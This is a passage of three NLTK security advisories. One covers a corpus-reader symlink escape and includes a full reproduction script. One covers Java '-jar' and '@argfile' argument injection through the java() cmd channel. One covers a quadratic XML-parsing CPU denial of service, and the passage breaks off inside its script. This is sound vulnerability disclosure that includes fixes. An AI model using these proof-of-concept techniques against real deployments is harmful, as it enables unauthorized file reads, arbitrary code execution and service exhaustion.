items.content_html:
affected: PyPI nltk >= 3.9.4 — CorpusReader.abspaths()/abspath() and the PlaintextCorpusReader / SyntaxCorpusReader view methods dynamically reproduced: nltk 3.9.4 (8/9, scoped-escape checks), 3.10.3 (wheel, 9/9 checks) and master 6818767b9 (9/9 checks)

Source references (file:line) are to commit 303f6e2b (release tag v3.10.3). Line numbers in the released nltk wheel match this tag exactly; master 6818767b9 contains the same code (pathsec.py renumbered by +44 lines from added hardening comments). In 3.9.4 the same logic exists at earlier line numbers (api.py:222-236 for open(), api.py:161-203 for abspath()/abspaths(), data.py:382-388 for the pointer open, pathsec.py:105-114 for the scoped branch); the affected code is identical.

Summary

CorpusReader.open() (nltk/corpus/reader/api.py:235-257) is NLTK's hardened file-access entry point: after a lexical guard it calls validate_path(..., required_root=self._root) (api.py:246-249), and the scoped branch of pathsec.validate_path (nltk/pathsec.py:168-179) resolves symlinks and raises ValueError when the resolved target is not inside the corpus root. The view methods do not use this entry point: PlaintextCorpusReader.words/sents/paras (nltk/corpus/reader/plaintext.py:67-118) and SyntaxCorpusReader.parsed_sents/tagged_sents/sents/tagged_words/words (api.py:473-519) build their streams from self.abspaths(fileids, ...) (api.py:174-217), which only does a lexical self._root.join(fileid) (nltk/data.py:452-469) and returns a FileSystemPathPointer. That pointer is opened via FileSystemPathPointer.open() → pathsec.open(raw_path, "rb") with required_root left at its default None (data.py:438-447, nltk/pathsec.py:752,783), so only the global allowed-roots check runs. The O_NOFOLLOW in _hardened_open (pathsec.py:676-731) protects only the final path component, so an intermediate-directory symlink inside the corpus root pointing at a sibling allowed root is followed by the kernel. A caller who places such a symlink (or loads an untrusted corpus containing one) can read any file that open() would refuse — files outside the corpus root yet inside the global NLTK data sandbox — via PlaintextCorpusReader.words([...]) / SyntaxCorpusReader.words([...]) (and the abspaths()-returned pointer), defeating the scoped escape protection that GHSA-p4rw-class fixes and test_required_root_blocks_symlink_escape were added for.

Details

Root cause: two sibling file-access channels on the same CorpusReader disagree about the scoped sandbox.

  1. CorpusReader.open() (api.py:235-257) — the guarded channel:

    • Layer 1 lexical guard (api.py:240-242) rejects absolute paths and ...
    • Layer 2 scoped guard (api.py:246-249) calls pathsec.validate_path(path, context="CorpusReader", required_root=self._root).
    • The required_root branch (pathsec.py:168-179) resolves the target with Path(raw).resolve() and raises ValueError when target.is_relative_to(scoped_root) is false.

  2. The view-method channel — abspaths() → FileSystemPathPointer → pathsec.open(required_root=None):

    • CorpusReader.abspath() (api.py:174-183) and abspaths() (api.py:185-217) return self._root.join(f) with no validate_path call.
    • FileSystemPathPointer.join() (data.py:452-469) only normalizes lexically (normpath + root-prefix startswith); it never calls os.path.realpath/Path.resolve, so the intermediate symlink is preserved verbatim.
    • FileSystemPathPointer.open() (data.py:438-447) calls _secure_open(self._path, "rb") (aliased from pathsec.open) with no required_root, so pathsec.open (pathsec.py:752) uses its default required_root=None and validate_path (pathsec.py:783) runs only the global allowed-roots check (pathsec.py:181-207).
    • Under ENFORCE=True + POSIX, _hardened_open (pathsec.py:676-731) opens with O_NOFOLLOW (pathsec.py:705) — but that flag only refuses a symlink in the final component; an intermediate directory symlink (corpus/sub -> <other allowed root>) is followed by the kernel. The post-open fd realpath re-validation (pathsec.py:728-731) again uses required_root=None, and since the target is inside an allowed root it passes.

  3. The view methods hand the unguarded pointers straight to the stream views:

    • PlaintextCorpusReader.words/sents/paras (plaintext.py:67-118, abspaths at 76/96/116) and chapters (plaintext.py:230).
    • SyntaxCorpusReader.parsed_sents/tagged_sents/sents/tagged_words/words (api.py:473-519, abspaths at 478/489/498/509/517).
    • StreamBackedCorpusView._open() (nltk/corpus/reader/util.py:203-216) calls self._fileid.open(self._encoding) on the PathPointer (util.py:210), landing in the required_root=None path above.

Net effect (observed): the identical fileid "sub/secret.txt" is rejected by reader.open() with ValueError: Security Violation [CorpusReader]: Path ... escapes root ... but successfully read by reader.words(["sub/secret.txt"]), returning the out-of-root file's content.

The abspaths()/view-method bypass contradicts the contract stated in open()'s docstring (api.py:238, "Security patched: prevents path traversal and scoped escapes") and the class-level promise that every fileid stays within the corpus root (api.py:26-30). Existing regression tests cover only the open()/validate_path(required_root=...) path (test_corpus_reader.py:31, test_corpus_reader_pathsec.py:39-49), not the view-method channel.

PoC

A self-contained, self-checking repro script is embedded at the end of this advisory. It builds a private temp sandbox as an allowed NLTK data root, creates corpus root R, sibling bar (inside the same allowed root), file bar/secret.txt = TOPSECRET, and an intermediate directory symlink R/sub -> bar. It then asserts the control (same fileid through open() is refused) and the attack (abspaths() pointer, PlaintextCorpusReader.words, SyntaxCorpusReader.words/sents read the secret), plus a boundary check that a symlink pointing outside every allowed root is still refused.

Scope note: dynamically run on (1) the released nltk 3.9.4 wheel, (2) the released nltk 3.10.3 wheel, and (3) master 6818767b9 (v3.10.3-15-g6818767b9). The scoped-escape checks pass on all three; the "global sandbox still blocks outside-allowed-root read" boundary check passes on 3.10.3 and master, and is expected to differ on 3.9.4: 3.9.4 ships pathsec.ENFORCE = False (enforcement became the default only in 3.10.0) and its pathsec.open is a thin builtins.open wrapper with no _hardened_open/O_NOFOLLOW, so on 3.9.4 the sandbox does not confine reads to the allowed roots at all — the escape is broader there, not narrower. The required_root scoped guard (1b0e519e2, "Implement scoped root validation in pathsec sentinel") is present in 3.9.4 and every later release (v3.10.0/3.10.1/3.10.2/3.10.3 confirmed by tag inspection), and static comparison shows the identical abspaths()/view-method code path in all of them; 3.9.4 and 3.10.3 were the versions dynamically run.

Environment / steps (Python 3.10.12, Linux, pathsec.ENFORCE=True, POSIX):

  1. SANDBOX=$(mktemp -d); nltk.data.path.append(SANDBOX) — the private dir becomes an allowed NLTK data root.
  2. R=$SANDBOX/corpora/mysample, BAR=$SANDBOX/bar; write BAR/secret.txt = TOPSECRET.
  3. ln -s "$BAR" "$R/sub" — intermediate directory symlink inside the corpus root.
  4. Control: reader.open("sub/secret.txt") → ValueError: Security Violation [CorpusReader]: Path <BAR>/secret.txt escapes root <R> (refused).
  5. Attack: reader.abspaths(["sub/secret.txt"])[0].open().read() → b'TOPSECRET\n'; list(reader.words(["sub/secret.txt"])) → ['TOPSECRET']; same for BracketParseCorpusReader.words/sents.
  6. Boundary: R/out -> /etc (outside every allowed root) is refused with PermissionError: Security Violation [pathsec.open]: Unauthorized path ....

Live transcript, key output (identical on nltk 3.9.4, 3.10.3 and master @ 6818767b9 unless noted):

nltk version: 3.9.4/3.10.3   python: 3.10.12   (posix)
CONTROL open() rejects symlink escape                 ValueError: ... escapes root ...
abspaths() pointer.open() reads outside root          b'TOPSECRET\n'
PlaintextCorpusReader.words() leaks outside root      ['TOPSECRET']
SyntaxCorpusReader.words() leaks outside root         ['TOPSECRET']
GLOBAL sandbox still blocks outside-allowed-root read PermissionError: ... Unauthorized path ...
                                                      (3.10.3+ only; on 3.9.4 the sandbox
                                                       is not enforced and the read succeeds)
RESULT: 3.9.4: 8/9 · 3.10.3: 9/9 · master: 9/9 (all scoped-escape checks pass)

The scoped-escape checks (the vulnerability itself) pass on all three pinned versions; the single 3.9.4 difference is the global-sandbox boundary check, which is weaker there by design (ENFORCE=False, thin pathsec.open).

Impact

  • Type: CWE-59 improper link resolution before file access (with CWE-22 traversal flavor). A local principal who can place an intermediate-directory symlink inside an NLTK corpus root — e.g. a user with any account that loads NLTK corpora, or the supplier of an untrusted corpus in a supply-chain/web-service loading model — can read the contents of any file that lies inside a global NLTK allowed root but outside the corpus root.
  • Who is impacted: any deployment where a trusted application loads NLTK corpus data that is or contains attacker-influenced directory symlinks: shared/multi-tenant pipelines, notebooks, services that extract downloaded corpora (via tar/git/app logic) into ~/nltk_data/nltk.data.path roots, and CI systems. The scoped guard was added specifically so that "corpus root + in-root symlink" cannot read outside the root even when the target stays inside the global sandbox.
  • Attacker requirements: a directory symlink must physically exist inside a corpus root on the target machine, pointing at another NLTK allowed root; the fileids passed to a view method must traverse it (fileids is caller-controlled on every affected view method). The attacker therefore needs local filesystem influence to place the symlink — direct write access to the data root, or supply of an untrusted corpus that is unpacked in a symlink-preserving way (manual tar extraction, git checkout, shared/multi-tenant data directory, or app-specific unpacking logic). Note that NLTK's own downloader only handles .zip, and Python zipfile extraction does not preserve symlinks (a symlink member is written as a plain file), so a bare "upload a zip" delivery does not by itself place the symlink. This is why the vector is scored AV:L/PR:L rather than AV:N/PR:N: the read is a local file access and the triggering symlink must already be on the local filesystem. In deployments where a symlink-preserving remote corpus feed feeds the data directory automatically, an attacker could achieve the same effect with no local account; that scenario is covered here under "who is impacted" rather than as a stronger default score.
  • Effect: cross-corpus / cross-data disclosure of file contents within the global NLTK data sandbox (e.g. reading one corpus through another, or reading private data staged under an allowed root). The global sandbox still confines reads to allowed roots; this does not reach /etc/passwd or arbitrary paths outside the sandbox.

Suggested fix: make the scoped check the single shared behavior of the corpus file-access surface instead of an open()-only special case:

  1. In CorpusReader.abspath()/abspaths() (api.py:174-217), run pathsec.validate_path(self._root.join(f), context="CorpusReader", required_root=self._root) for every f before returning the pointer — this is the same Layer-2 check open() performs at api.py:246-249, so both channels reject a symlink-resolved escape identically.
  2. Alternatively (or additionally), thread required_root through the pointer: have CorpusReader attach its root to the FileSystemPathPointer (or have StreamBackedCorpusView._open() in util.py:203-216 pass a scoped root), so pathsec.open/_hardened_open validate the opened fd's realpath against the corpus root — closing the same gap for any future caller that opens pointers.
  3. Add regression coverage mirroring test_required_root_blocks_symlink_escape for the view-method channel: a corpus root inside a global allowed root, an intermediate directory symlink to an out-of-root sibling, explicit fileids=["sub/secret.txt"], and an assertion that reader.words(fileids=[...]) (and sents/abspaths().open()) raise ValueError/PermissionError exactly as reader.open(...) does.

Reproduction script (self-contained)

# Self-checking, control-grouped reproduction script embedded in this advisory.
# Usage: python3 - <<'EOF' ... EOF   (requires: pip install nltk)
# A private temp sandbox is created at runtime and registered via nltk.data.path.

#!/usr/bin/env python3
"""Self-checking reproduction of CorpusReader view-method scoped-sandbox bypass.

The affected surfaces are:
  - CorpusReader.abspaths()/abspath() return a FileSystemPathPointer without the
    required_root scoped check that CorpusReader.open() applies (api.py:235-257);
    PlaintextCorpusReader view methods open those pointers directly.
  - SyntaxCorpusReader view methods (words/sents/parsed_sents/tagged_words/
    tagged_sents) also open via abspaths() without the scoped check.

Control group: the SAME fileid through reader.open() is rejected by the Layer-2
scoped guard (validate_path(..., required_root=self._root)).

Environment: base sandbox dir is a private temp dir appended to nltk.data.path
(the attacker-controlled corpus root lives inside an allowed NLTK data root).
"""

import os
import shutil
import sys
import tempfile

import nltk
import nltk.data

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"PASS  {name}  {detail}")
    else:
        FAIL += 1
        print(f"FAIL  {name}  {detail}")


def main():
    print(f"nltk version: {nltk.__version__}   python: {sys.version.split()[0]}")
    import nltk.pathsec as ps

    print(f"pathsec.ENFORCE = {ps.ENFORCE}   posix = {os.name == 'posix'}")

    base = tempfile.mkdtemp(prefix="nltk_sandbox_")
    os.chmod(base, 0o700)
    nltk.data.path.append(base)  # make the private sandbox an allowed NLTK data root

    rootA = os.path.join(base, "corpora", "mysample")   # corpus root R
    rootB = os.path.join(base, "bar")                   # sibling, inside allowed root
    os.makedirs(rootA)
    os.makedirs(rootB)

    secret = "TOPSECRET"
    with open(os.path.join(rootB, "secret.txt"), "w") as f:
        f.write(secret + "\n")

    # Bracket-parse file is read as sexpr blocks by BracketParseCorpusReader
    with open(os.path.join(rootB, "bracket.txt"), "w") as f:
        f.write("(S (NP TOPSECRET))\n")

    # Intermediate-directory symlink inside the corpus root -> sibling outside R
    linkdir = os.path.join(rootA, "sub")
    os.symlink(rootB, linkdir)

    check("sandbox is an allowed root", base in {str(p) for p in ps._get_allowed_roots()})
    check("symlink created", os.path.islink(linkdir))

    # ---------------------------------------------------------------- control
    from nltk.corpus.reader.plaintext import PlaintextCorpusReader

    reader = PlaintextCorpusReader(rootA, r".*")
    try:
        reader.open("sub/secret.txt")
        check("CONTROL open() rejects symlink escape", False, "no exception raised")
    except ValueError as e:
        check("CONTROL open() rejects symlink escape", True, f"ValueError: {str(e)[:60]}")
    except PermissionError as e:
        check("CONTROL open() rejects symlink escape", True, f"PermissionError: {str(e)[:60]}")
    except Exception as e:
        check("CONTROL open() rejects symlink escape", True, f"{type(e).__name__}: {str(e)[:60]}")

    # ------------------------------------------------- abspaths() pointer
    ptr = reader.abspaths(["sub/secret.txt"])[0]
    try:
        content = ptr.open().read()
        check("abspaths() pointer.open() reads outside root", content == (secret + "\n").encode(), f"got {content!r}")
    except Exception as e:
        check("abspaths() pointer.open() reads outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    # ------------------------------------------------- PlaintextReader.words()
    try:
        words = list(reader.words(["sub/secret.txt"]))
        check("PlaintextCorpusReader.words() leaks outside root", any(secret in w for w in words), f"words={words}")
    except Exception as e:
        check("PlaintextCorpusReader.words() leaks outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    # ------------------------------------------------------------ syntax views
    from nltk.corpus.reader.bracket_parse import BracketParseCorpusReader

    brow = BracketParseCorpusReader(rootA, r".*")
    try:
        # control on the syntax reader open()
        brow.open("sub/bracket.txt")
        check("CONTROL syntax reader open() rejects symlink escape", False, "no exception raised")
    except Exception as e:
        check("CONTROL syntax reader open() rejects symlink escape", True, f"{type(e).__name__}: {str(e)[:60]}")

    try:
        sent = list(brow.words(["sub/bracket.txt"]))
        check("SyntaxCorpusReader.words() leaks outside root", any(secret in w for w in sent), f"words={sent}")
    except Exception as e:
        check("SyntaxCorpusReader.words() leaks outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    try:
        sents = list(brow.sents(["sub/bracket.txt"]))
        check("SyntaxCorpusReader.sents() leaks outside root", any(secret in w for w in sents), f"sents={sents}")
    except Exception as e:
        check("SyntaxCorpusReader.sents() leaks outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    # ----------------------------------------------------------- global-sandbox boundary
    # The escape is bounded: a file OUTSIDE every allowed root must still be refused.
    outside = os.path.join(base, "..", "etc")
    os.makedirs(outside, exist_ok=True)
    outfile = os.path.join(outside, "secret.txt")
    with open(outfile, "w") as f:
        f.write("OUTSIDE\n")
    # point a second symlink inside rootA to a directory outside all allowed roots
    linkout = os.path.join(rootA, "out")
    os.symlink(outside, linkout)
    try:
        got = reader.abspaths(["out/secret.txt"])[0].open().read()
        check("GLOBAL sandbox still blocks outside-allowed-root read", False, f"leaked {got!r}")
    except Exception as e:
        check("GLOBAL sandbox still blocks outside-allowed-root read", True, f"{type(e).__name__}: {str(e)[:60]}")

    print(f"\nRESULT: {PASS} passed, {FAIL} failed")
    shutil.rmtree(base, ignore_errors=True)
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    sys.exit(main())

Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3761 "Contain CorpusReader / agreement / chat80 file I/O in the pathsec sandbox", merged 2026-08-17, merge commit cd4953f7b on develop. Fix commit: 9f7cf06b4 (the corpus-reader path pointers and view methods resolve and validate against the reader's root, so an intermediate directory symlink that leaves the root is refused).

Probe: none. The advisory PoC re-run (a corpus root R with R/sub pointing at a sibling directory inside the same data root, then abspaths()[0].open(), words() and open() on sub/secret.txt): on develop 2fa3f48fe all three are refused with ValueError (security violation, path escapes root); on v3.10.3 and on 6818767b9 abspaths().open() and words() return the secret while open() is refused, which matches the advisory. A bisect of develop between 6818767b9 and 2fa3f48fe with that reproduction names 9f7cf06b4 as the first fixed commit.

Release: none yet; no release tag contains 9f7cf06b4.

References

items.title: [nltk] NLTK corpus-reader view methods bypass the scoped root sandbox via intermediate-directory symlinks

items.content_html:
Summary

NLTK 3.10.3 contains security hardening intended to close JVM argument-injection and untrusted JAR/classpath execution paths in nltk.internals.java(), including the issue published as GHSA-m4rf-3fr8-xwx3.

The patched options channel correctly rejects Java argument-file references such as @/path/to/args and launcher modes such as -jar. However, an additional argument channel remains: the caller-provided cmd sequence is appended to the Java command after the validated option and classpath channels, without enforcing that its first item is a Java main-class name.

I am reporting this as an additional post-fix bypass / incomplete-fix path affecting the 3.10.3 remediation, rather than as an unrelated vulnerability family.

As a result, the same launcher token that is rejected through options can be supplied as the first cmd item. I confirmed two reachable forms against the official nltk-3.10.3-py3-none-any.whl:

  1. direct use of the public nltk.internals.java() helper with cmd=["-jar", ...]; and
  2. the higher-level StanfordSegmenter, whose public java_class constructor argument becomes the first cmd item and accepts an @argfile launcher token.

Both paths execute an external researcher-controlled JAR without setting NLTK_ALLOW_UNSAFE_JARS, NLTK_ALLOW_UNSAFE_CLASSPATH, or using trusted_raw_options. The original explicit outside-classpath route is blocked in 3.10.3, while the alternate command channel executes the JAR 3/3 times.

Affected artifact

Package: nltk
Confirmed affected version: 3.10.3
Wheel: nltk-3.10.3-py3-none-any.whl
SHA-256: ff9598a8e20518ee0d557745890cc4435b9578489e2dcbc69c4f81fa060caf7c

Baseline artifact:

Version: 3.10.2
Wheel: nltk-3.10.2-py3-none-any.whl
SHA-256: 2c7ccacb765c5e26b0cb60fb1b57080af522c6924d12a714a243305ba3637412

Relationship to the 3.10.3 security fixes

The existing 3.10.3 hardening validates the dedicated per-call options list before it reaches subprocess.Popen. In particular, the exact @argfile token used in this report is rejected through options with a ValueError that references CVE-2026-12841 and CWE-88.

The command is subsequently assembled in this order:

final_cmd.extend(validated_options)
if classpath_arg is not None:
    final_cmd.extend(["-cp", classpath_arg])
final_cmd.extend(cmd_list)

cmd_list is copied from the public cmd argument but its first token is not checked to ensure that it is an ordinary Java main class. Java therefore interprets leading -jar, @argfile, module-mode, or classpath-mode tokens as launcher control arguments rather than application arguments.

This is an alternate argument channel around the same JVM argument/JAR execution boundary protected by the 3.10.3 changes.

Confirmed API paths

Direct public helper

nltk.internals.java(
    ["-jar", "/outside/trusted/roots/controlled.jar"],
    classpath=None,
    stdout="pipe",
    stderr="pipe",
)

The external JAR executed in all three subject runs.

Higher-level StanfordSegmenter path

StanfordSegmenter exposes a public java_class constructor argument, stores it, and later places it at the beginning of the cmd sequence passed to nltk.internals.java().

A controlled argument file containing a -jar launcher invocation was supplied as:

StanfordSegmenter(
    path_to_jar=trusted_segmenter_jar,
    java_class="@/path/to/controlled-launcher.args",
    path_to_model="dummy-model",
    java_options=[],
)

The trusted segmenter JAR passed the wrapper's checksum and classpath checks. The @argfile then switched the Java launcher to the external JAR, which executed in all three runs.

The deprecated wrapper subsequently raised an unrelated post-launch AttributeError while processing its output. The external marker had already been written by the child JVM before that exception.

Proof matrix

R1  NLTK 3.10.2 + explicit external classpath
    -> controlled Java bytecode executed

R2  NLTK 3.10.3 + same explicit external classpath
    -> UntrustedJarError; no marker

R3A NLTK 3.10.3 + direct cmd=["-jar", external_jar]
    -> controlled external JAR executed, 3/3

R3B NLTK 3.10.3 + StanfordSegmenter(java_class="@argfile")
    -> controlled external JAR executed, 3/3

R4  NLTK 3.10.3 + ordinary main class in trusted classpath
    -> legitimate execution preserved

A direct channel comparison also confirmed:

options=["@argfile"]       -> BLOCKED
cmd/java_class="@argfile"  -> EXTERNAL JAR EXECUTED

Machine-readable proof results and a portable reproducer are attached.

Preconditions

Practical exploitability depends on an embedding application exposing attacker influence over one of these public argument paths:

  • the leading item of nltk.internals.java(cmd=...); or
  • StanfordSegmenter(java_class=...) or an equivalent wrapper-controlled command token.

The attacker must also be able to reference an argument file or JAR readable by the NLTK process. The Java child process executes with the privileges of that process.

This is not a claim that importing NLTK alone is remotely exploitable. The confirmed issue is that the default protected execution boundary can be bypassed when these argument channels are exposed to untrusted input.

Impact

Successful exploitation allows execution of attacker-selected Java bytecode with the privileges of the process using NLTK.

Suggested classifications:

  • CWE-88: Improper Neutralization of Argument Delimiters in a Command
  • CWE-94: Improper Control of Generation of Code

Suggested severity: Moderate, subject to maintainer assessment of realistic argument reachability in embedding applications.

Reproduction

The complete reproducer, machine-readable proof results, and proposed remediation are included in the attached evidence package.

nltk-3103-candidate-a-maintainer-evidence.zip

The included reproducer/reproduce_cmd_channel_bypass.py creates only temporary researcher-controlled Java source, JAR, argument-file, and marker artifacts. It performs no network access.

Requirements:

  • Python 3.10 or newer
  • nltk==3.10.3
  • a JDK providing java, javac, and jar

Run:

python reproducer/reproduce_cmd_channel_bypass.py

A confirmed run exits with status 0 and reports that:

  • the options channel blocks @argfile;
  • the direct cmd channel executes the external JAR 3/3;
  • the higher-level StanfordSegmenter.java_class channel executes it 3/3; and
  • legitimate trusted main-class execution remains functional.

Recommended remediation

Enforce that the first ordinary cmd item is a Java main-class token. Reject Java launcher switches and @argfile references in this channel by default, before constructing or executing the subprocess command.

For example:

cmd_list = list(cmd)
if not cmd_list:
    raise ValueError("cmd must contain a Java main class")
first = cmd_list[0]
if not isinstance(first, str) or not first or first.startswith(("-", "@")):
    raise ValueError("cmd must begin with a Java main class")

If raw Java launcher modes are intentionally supported, they should require a clearly named explicit trusted escape hatch rather than sharing the normal main-class channel.

The attachment includes a proposed source patch and focused regression tests. Local verification against code derived from the official 3.10.3 wheel showed:

direct -jar command channel       BLOCKED
StanfordSegmenter @argfile path   BLOCKED
external marker creation          BLOCKED
legitimate trusted main class     PRESERVED

Relationship to existing advisory / duplicate note

The public advisory GHSA-m4rf-3fr8-xwx3 describes the per-call options validation gap fixed in 3.10.3. This report is intentionally scoped as an additional bypass of that remediation through the distinct cmd/java_class argument channel.

I did not locate a public advisory, issue, or pull request describing this leading-cmd launcher-token path. I cannot determine whether an equivalent private report already exists, so please deduplicate this report against any private reports or unpublished follow-up work.

Please keep this report and attachment private while assessing and preparing any fix. I am available to test a candidate patch and adapt the regression tests to the project's preferred style.

Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3771 "Reject Java launcher switches and @argfiles in the java() cmd argument (CWE-88)", merged 2026-08-20, merge commit 45a08fded on develop. Fix commit: b36212795 (java() raises ValueError when the first cmd token is a launcher switch or an @argfile, and when any cmd token is an @argfile; StanfordSegmenter passes its java_class as that first token, nltk/tokenize/stanford_segmenter.py line 432, so both reported paths hit the same check).

Probe: none. Reproduction on develop 2fa3f48fe with the process spawn intercepted: cmd=["-jar", jar], cmd=["@argfile"] and cmd=["Main", "@argfile"] each raise ValueError (CWE-88) before any spawn.

Release: none yet; no release tag contains b36212795.

References

  • https://github.com/nltk/nltk/security/advisories/GHSA-x8q7-6c7m-52gw
  • https://nvd.nist.gov/vuln/detail/CVE-2026-128138
  • https://github.com/nltk/nltk/pull/3771
  • https://github.com/nltk/nltk/commit/b36212795a522d2b7b176cf0e0d9d8da489ba6e6
  • https://github.com/nltk/nltk/releases/tag/v3.10.4
  • https://github.com/advisories/GHSA-x8q7-6c7m-52gw

affected: PyPI nltk >= 3.6 — nltk.corpus.reader.xmldocs.XMLCorpusView streaming read (and the nps_chat / framenet readers built on it) dynamically reproduced: 3.6 (6/6 checks), 3.9.2 (6/6), 3.10.3 (6/6) and develop 6818767b9 (6/6)

Source references (nltk/corpus/reader/xmldocs.py:NNN) are to commit 6818767b99c24659107eb2be9bccd32a3d4bf045 (develop, v3.10.3-15-g6818767b9). The released v3.10.3 wheel's xmldocs.py is byte-identical to that commit, so the same line numbers apply to the released wheel.

Summary

An attacker who can make a victim read a well-formed XML corpus file whose body contains one large comment or CDATA section can pin a CPU core for a time quadratic in the file size, because XMLCorpusView._read_xml_fragment (nltk/corpus/reader/xmldocs.py) re-runs a linear whole-buffer validation after every 1 KiB block while the comment/CDATA terminator is still ahead. XMLCorpusView is NLTK's documented streaming API for XML corpora and is instantiated directly by the NPSChatCorpusReader and FramenetCorpusReader readers; the module header (xmldocs.py:16-20) explicitly handles untrusted corpus XML. The in_tag guard added to this function for GHSA-vp2x covers only a single oversized <...> tag and leaves the CDATA/comment path quadratic in the current release.

Details

Root cause: _read_xml_fragment (xmldocs.py:273-338) accumulates the file into one fragment string in _BLOCK_SIZE (1024) character chunks (xmldocs.py:123, 298-299). After every block that is not yet a well-formed prefix, the fragment is re-validated against _VALID_XML_RE. Two whole-buffer operations dominate:

# xmldocs.py:308
if not in_tag and self._VALID_XML_RE.match(fragment):      # whole-buffer match (O(len))
    return fragment
# xmldocs.py:312
if re.search("[<>]", fragment).group(0) == ">":            # O(1) for this input class:
    ...                                                     # the document starts with '<'
# xmldocs.py:329
if self._VALID_XML_RE.match(fragment[:last_open_bracket]): # whole-buffer prefix match (O(len))
    ...

For this input class the re.search probe at xmldocs.py:312 is O(1): the fragment always starts with < (e.g. <root>…), so the first </> character is at offset 0 and it never contributes cost. The quadratic cost comes entirely from the two whole-buffer regex matches at xmldocs.py:308 and xmldocs.py:329 (the latter scans the buffer up to the most recent <, which for this input sits near the end of the buffer).

_VALID_XML_RE (xmldocs.py:238-249) is a linear regex (its tempered-dot comment/CDATA bodies (?:(?!-->).)* / (?:(?!\]\]>).)* scan left-to-right in O(length) — confirmed by the embedded script's single-match check), but for a fragment whose terminator is far ahead the match itself fails after scanning the whole buffer. With an unclosed-across-blocks CDATA or comment, every one of the n/1024 blocks pays O(current buffer length) on lines 308 and 329, for a total of ~O(n²) character operations.

The in_tag guard added for GHSA-vp2x (xmldocs.py:283-305) tracks only bare </> characters: it is True inside an unclosed <...> tag and, in that state, skips only the line-308 match. It never represents "the fragment sits inside an unclosed CDATA or comment" — XML allows arbitrary </> inside those constructs — so both the line-308 match and the line-329 backtrack match still fire on every block for a CDATA/comment fragment. The comment block at xmldocs.py:283-289 even documents the intended linearity contract ("re-running it on every 1 KiB block otherwise makes a single oversized tag O(n^2) (CWE-407)"); the guard implements it for the tag branch only.

The single-match cost is linear, not super-linear: the embedded script measures _VALID_XML_RE.match() on 512 KiB → 1 MiB → 2 MiB unclosed-CDATA buffers and gets ≈ 0.074 s → 0.142 s → 0.280 s (≈ 1:1.9:3.8, i.e. linear), asserting the 4× ratio stays well below the quadratic bound. The quadratic total therefore comes from re-running those linear matches per block — the exact CWE-407 pattern the in-tag guard was introduced to eliminate.

Version nuance (all dynamically verified):

  • 3.10.3 / develop (guard present): the pinned regex validates CDATA correctly, so both the comment and the CDATA attack documents read successfully and return; both scale super-linearly (t(4n)/t(n) ≈ 13-16; linear would be ≈ 4). The oversized single-tag control reads linearly (ratio ≈ 4.0), proving the quadratic cost is specific to the unguarded CDATA/comment path.
  • 3.6 / 3.9.2 (pre-guard): these releases use a lazy _VALID_XML_RE whose CDATA alternative <![CDATA[.*?]]> never matches (the [CDATA[.*?] substring is parsed as a character class), so a CDATA document is rejected with ValueError: Unexpected end of file: tag not closed after the quadratic scan — a separate functional defect. The comment variant is a clean well-formed document on these releases and is likewise quadratic (t(4n)/t(n) ≈ 14-16); the oversized-tag control also reads quadratically there (ratio ≈ 16), i.e. the whole unclosed-construct class GHSA-vp2x addressed is unpatched.

PoC

The self-checking script embedded at the end of this advisory builds a well-formed XML document whose root holds a large comment containing </> characters with no --> before the final marker, drives XMLCorpusView's fragment reader at sizes n and 4n, and asserts the doubling ratio is far above linear. It also runs the CDATA variant, a single-match linearity check (proving the regex itself is not the super-linear factor), a linear-control giant tag, a well-formedness check, and a public-API reachability check, exiting non-zero on any failure.

Scope note: dynamically run on 3.6, 3.9.2, 3.10.3 (released wheels from PyPI / the local 3.10.3 wheel) and develop 6818767b9 (checked out source). No releases outside those were run; the >= 3.6 bound is the oldest release tested. Environment for the recorded runs: CPython 3.10.12, Linux x86_64. Input sizes are 64 KiB vs 256 KiB (attack) and 1 MiB vs 4 MiB (linear control), so a full run takes a few seconds.

Impact

  • Type: CWE-407 / CWE-400 — CPU exhaustion / algorithmic-complexity denial of service on a single untrusted corpus-file read; no confidentiality or integrity impact.
  • Who is impacted: any deployment that feeds corpus XML to XMLCorpusView (or to the nps_chat / framenet readers) from a source not fully trusted — the exact "untrusted input" threat model in SECURITY.md. The input is ordinary, well-formed XML; nothing about it is malformed or rejected by any parser.
  • Attacker requirements: deliver a well-formed XML file whose body contains a large comment or CDATA section with </> characters and the terminator at the end. No privilege and no user interaction are required beyond the automated read of the file — the same delivery model as other NLTK resource-loading issues (SECURITY.md), where a service, CI pipeline or notebook ingests a corpus file (uploaded, packaged, or fetched by the loader); this justifies UI:N and AV:N in the score above.
  • Effect: measured 256 KiB → ~1.1 s single read; cost scales with the square of the input size (t(4n)/t(n) ≈ 13-16), so a few MiB reaches tens of seconds and tens of MiB reaches minutes of CPU on a single core. Because the file is well-formed and the read eventually succeeds (current releases), ordinary users observe only severe slowdown; a scheduler/job that processes many such files is trivially pinned.

Suggested fix: extend the incremental state tracking to CDATA/comment/DOCTYPE like in_tag already does for tags: while scanning each newly-read block, also track whether the fragment sits inside an unclosed <!... construct (no ]]> / --> / doctype terminator yet), and skip the whole-buffer matches at xmldocs.py:308 and xmldocs.py:329 whenever the fragment is provably non-well-formed for that reason — the same behaviour-preserving argument the in-tag guard already documents. Alternatively, only re-validate the newly-read block plus a bounded suffix instead of the whole growing buffer. Add regression tests mirroring the existing nltk/test/unit/test_quadratic_dos.py cluster (GHSA-vp2x) with comment and CDATA payloads asserting the doubling ratio stays linear.

Reproduction script (self-contained)

#!/usr/bin/env python3
"""Self-checking reproduction of the NLTK XMLCorpusView algorithmic-complexity
CPU DoS for unclosed-across-blocks CDATA / comments (O(n^2) read cost).

Root cause: ``XMLCorpusView._read_xml_fragment`` (``nltk/corpus/reader/xmldocs.py``)
reads a file in 1024-char blocks and accumulates them into a single ``fragment``.
After every block that is not yet a well-formed prefix, it re-runs a *linear*
pass over the whole growing buffer -- ``_VALID_XML_RE.match(fragment)`` and, when
it backtracks, ``_VALID_XML_RE.match(fragment[:last_lt])``. (A third probe,
``re.search("[<>]", fragment)``, is O(1) here because the document starts with
'<'.)
